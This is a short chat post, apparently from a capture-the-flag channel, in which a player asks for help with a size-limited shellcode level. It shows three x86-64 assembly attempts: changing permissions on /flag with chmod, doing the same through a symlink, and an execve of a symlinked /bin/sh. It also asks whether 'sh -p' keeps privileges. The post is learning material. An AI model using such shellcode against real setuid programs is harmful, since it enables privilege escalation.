hey guys I would like for some help a level 8 (0x12 bytes shellcode).
I've tried two methods (SPOILER ALERT):

1. Simply chmoding "/flag", didn't seem to work (exactly 0x12 bytes):
 
mov rbx, 0x00000067616c662f  # /flag
push rbx
push rsp   # very cool - takes only one byte
pop rdi
push 7  #rwx permissions
pop rsi
mov al, 90
syscall


2. Symlinked "a" to "/flag", didn't seem to work either:

push 0x61  # "a" string
push rsp   # very cool - takes only one byte!
pop rdi
push 7
pop rsi
mov al, 90
syscall

However, it DID worked when i symlinked "a" to a TEST file (image included).

3. Executing bash: 

push 0x61
push rsp   # very cool - takes only one byte!
pop rdi  # points towards "a", symlink to "/bin/sh"
xor rsi, rsi


mov al, 59
cdq  # reset rdx within a single byte!

syscall

With a symlink to "a", got a shell.
However, the shell doesn't seem to be priviledged. Do i have to pass "-p" argument to it? (edited)

@ggwpyour code needs to be 12 bytes long i think
